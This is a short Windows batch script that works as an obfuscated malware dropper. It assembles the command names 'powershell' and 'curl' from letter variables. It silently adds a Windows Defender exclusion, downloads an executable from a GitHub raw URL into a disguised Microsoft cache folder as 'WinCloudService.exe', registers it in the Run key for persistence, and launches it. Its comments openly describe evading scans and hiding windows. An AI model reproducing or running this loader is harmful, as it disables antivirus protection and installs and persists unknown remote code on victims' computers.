@echo off
set "v1=p" & set "v2=o" & set "v3=w" & set "v4=e" & set "v5=r" & set "v6=s" & set "v7=h" & set "v8=l"
set "d1=c" & set "d2=u" & set "d3=r" & set "d4=l"

:: Using a System32-looking path to avoid simple folder scans
set "TD=%LOCALAPPDATA%\Microsoft\Windows\Caches\"
set "FN=WinCloudService.exe"
set "URL=https://github.com/fullylaw/happy.org/raw/main/dread.exe"

if not exist "%TD%" mkdir "%TD%" >nul 2>&1

:: Attempting to add the exclusion via a hidden PowerShell window
%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TD%'" >nul 2>&1

:: Download with a 'Silent' curl flag
%d1%%d2%%d3%%d4% -s -L -o "%TD%%FN%" "%URL%" >nul 2>&1

:: Registry persistence using a generic name
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsCloudSync" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1

:: Launch and immediately kill the batch process to hide the window
start /b "" "%TD%%FN%"
exit
